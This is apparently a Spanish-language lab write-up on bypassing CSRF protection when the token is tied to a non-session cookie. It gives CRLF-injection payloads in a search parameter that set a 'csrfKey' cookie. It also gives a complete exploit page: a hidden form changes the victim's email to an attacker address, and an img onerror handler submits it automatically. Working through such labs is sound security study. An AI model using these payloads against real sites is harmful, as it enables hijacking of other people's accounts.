# CSRF con token atado a cookie sin sesión 

Tags: #CSRF #BurpSuite #XSRF   

```bash 
En esta ocasión se emplean token para prevenir ataques CSRF, pero no estan integrados a la sesión del sito 

1. Se tiene dos inicios de sesión con credenciales diferentes 
2. El 'csrfkey' esta vinculado al 'csrf token' por lo que se necesitan los dos validos
```

```bash 
# Para hacer un salto de linea se necesita el 'retorno de carro = %0d' y el 'salto de linea = %0a'. El espacio es con '%20' y el punto y coma es '%3b'

	/?search=hola;%20csrfkey=a
	/?search=hola%20csrfkey=a

	/?search=hola%0d%0aSet-Cookie:%20csrfkey=a    // Generar un salto de linea para crear una nueva cabecera y así se pueda setear el 'csrfkey'
```

```HTML
# Se necesita cambiar a nuestro 'csrfkey' y asignar el 'csrf token' de nuestra sesión en el formulario para que cuando la víctima lo visite este cambie el correo 

<form class="login-form" name="change-email-form" action="https://web.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="hacked@hacked.com">
	<input required="" type="hidden" name="csrf" value="123234556qwerty">
</form>

<img src="https://web.com/?search=hola%0d%0aSet-Cookie:%20csrfKey=12324qwerty%3b%20SameSite=None" onerror="document.forms[0].submit();">


Notas:
	1. La víctima esta visitando una pagina externa por lo que debe de agregar una nueva cookie 'Same site' para designar aqullas cookies a las que se puede acceder desde varios sitios 
```